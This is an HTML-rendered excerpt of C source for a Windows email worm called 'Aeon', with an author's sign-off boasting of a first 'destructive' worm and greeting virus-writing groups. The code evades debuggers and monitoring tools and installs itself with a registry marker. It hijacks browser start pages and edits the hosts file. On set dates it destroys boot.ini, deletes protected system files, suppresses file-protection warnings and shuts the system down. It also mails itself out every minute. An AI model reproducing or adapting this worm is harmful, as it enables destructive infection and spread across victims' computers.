</span><span class="sc1">/* ========= MAIN CODE ========= MAIN CODE ========= MAIN CODE ========= MAIN CODE ========= */</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">WinMain</span><span class="sc10">(</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hPrevInstance</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">lpCmdLine</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nShowCmd</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hWnd</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SYSTEMTIME</span><span class="sc0"> </span><span class="sc11">stTime</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">bInfected</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">bSoftIce</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">bOllyDbg</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">bFileMon</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">bRegMon</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwThreadID</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szDate</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* Wait 5 minutes before doing something */</span><span class="sc0">
    </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">300000</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Create a mutex to make sure the worm is only running one time */</span><span class="sc0">
    </span><span class="sc11">CreateMutex</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AEON"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">GetLastError</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ERROR_ALREADY_EXISTS</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">ExitProcess</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* Check for SoftIce/OllyDbg/FileMon/RegMon */</span><span class="sc0">
    </span><span class="sc11">bSoftIce</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IsSoftIcePresent</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">bOllyDbg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IsOllyDbgPresent</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">bFileMon</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IsFileMonPresent</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">bRegMon</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IsRegMonPresent</span><span class="sc10">();</span><span class="sc0">

    </span><span class="sc1">/* If any of the tools is running exit the application */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">bSoftIce</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bOllyDbg</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bFileMon</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bRegMon</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">ExitProcess</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* Test if PC is still infected */</span><span class="sc0">
    </span><span class="sc11">bInfected</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IsPCInfected</span><span class="sc10">();</span><span class="sc0">

    </span><span class="sc1">/* If PC is not yet infected dot he following... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">bInfected</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szBlackIce</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Aeon"</span><span class="sc10">;</span><span class="sc0">
    
        </span><span class="sc1">/* Create the key showing that the PC is infected now */</span><span class="sc0">
        </span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SYSTEM\\Aeon"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Aeon"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szBlackIce</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szBlackIce</span><span class="sc10">));</span><span class="sc0">
        </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc1">/* For detailed descriptions look at the specific functions above */</span><span class="sc0">
        </span><span class="sc11">ChangeNameOrg</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc11">MakeHidden</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc11">CopyToPC</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc11">IEStartPageBSoD</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc11">FirefoxStartPageBSoD</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc11">OperaStartPageBSoD</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc11">ModifyHostFile</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc11">DisableMAPIWarning</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* Get the system time */</span><span class="sc0">
    </span><span class="sc11">GetSystemTime</span><span class="sc10">(&amp;</span><span class="sc11">stTime</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc1">/* Saving in a format only telling day (1, 2, 3...) */</span><span class="sc0">
    </span><span class="sc11">GetDateFormat</span><span class="sc10">(</span><span class="sc11">LOCALE_USER_DEFAULT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">stTime</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dd"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szDate</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szDate</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc1">/* If it is the 1st, 14th or 28th of a month go to start the destructive PAYLOAD */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">14</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stTime</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">28</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* For detailed description look at the specific functions above */</span><span class="sc0">
        </span><span class="sc11">DestroyBootIni</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc11">ModifyHCR</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc11">BlackSystem</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc11">Messagebox</span><span class="sc10">();</span><span class="sc0">

        </span><span class="sc1">/* Delete all files in the FileNameList array by using the function DeleteFileName() */</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">FileNameList</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">DeleteFileName</span><span class="sc10">(</span><span class="sc11">FileNameList</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc1">/* Wait for 5 seconds */</span><span class="sc0">
        </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">5000</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc1">/* Catch the upcoming Warning window after deleting the SFC protected files and close it (German) */</span><span class="sc0">
        </span><span class="sc11">hWnd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindWindow</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Windows-Dateischutz"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">CloseWindow</span><span class="sc10">(</span><span class="sc11">hWnd</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc1">/* Catch the upcoming Warning window after deleting the SFC protected files and close it (English) */</span><span class="sc0">
        </span><span class="sc11">hWnd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindWindow</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Windows File Protection"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">CloseWindow</span><span class="sc10">(</span><span class="sc11">hWnd</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc1">/* Drop a batch file and open it 10 times, keeping the windows open */</span><span class="sc0">
        </span><span class="sc11">DropAndExecuteBatch</span><span class="sc10">();</span><span class="sc0">

        </span><span class="sc1">/* Wait another 5 seconds */</span><span class="sc0">
        </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">5000</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc1">/* Shut down the system finally */</span><span class="sc0">
        </span><span class="sc11">SystemShutdown</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* Stay in background and try to spread via email every 60 seconds by creating a thread */</span><span class="sc0">
    </span><span class="sc5">do</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* Create a thread and trie to spread via email */</span><span class="sc0">
        </span><span class="sc11">CreateThread</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPTHREAD_START_ROUTINE</span><span class="sc10">)</span><span class="sc11">MailMySelf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">bSoftIce</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bOllyDbg</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bFileMon</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bRegMon</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">ExitProcess</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">60000</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc10">}</span><span class="sc1">/* The End */</span><span class="sc0">

</span><span class="sc1">/* 

Yeah that's it, my first worm and most complex (destructive ^^) creation until now... Learned new and cool stuff and 
had got ideas from several things. I like to thank &lt;-&lt; WarGame &gt;-&gt; most, for his patience with me and my sutpid questions and
giving me cool ideas while talking with him about code and plans for creations, thanks man ;)

It is also very practical to read virus description, I got many new ideas while looking over the things that others did
and hopefully even improved it =) The Firefox and Opera hacks were most fun while coding this, as it is quite new to change
anything of this two browsers, well my experience, Opera is even easier then Internet Explorer, but Firefox is quite complex,
using a JavaScript file to store preferences.

I also read an article about anti-cracking methods in Hakin9 (www.hakin9.org/en), it was an article from one of the first issues
in 2005 and this helped me doing the anti-debugging functions, I just picked out some of them and coded them, there were several
ones more explained, maybe in a next creation ;)

Greets to all the great guys of &lt;-&lt; EOF &gt;-&gt;, it is great having such guys to code with, thanks for all and let us rock the scene!

Greets to Doomriderz Team, THE US Team in virus coding, you are doing a great job and are smart people to have interesting
conversations with: Go on!

Greets to Ready Rangers Liberation Front, with most of you I can talk even in my native language =), you are cool and always
friendly / helpful, keep it like this and good luck with everything!

And last, but not least some greets to everyone supporting us building up this magazine / project, especially Skvoznoy as being
a good friend and an supporter as well, thanks bro and thanks to all other people helping us in any way, to all the contributors,
keep on and the second issue will be rocking the same and better =) Also some greets to all VXers, Hackers and Crackers out there! 

*/</span><span class="sc0">
</span></div></body>
</html>
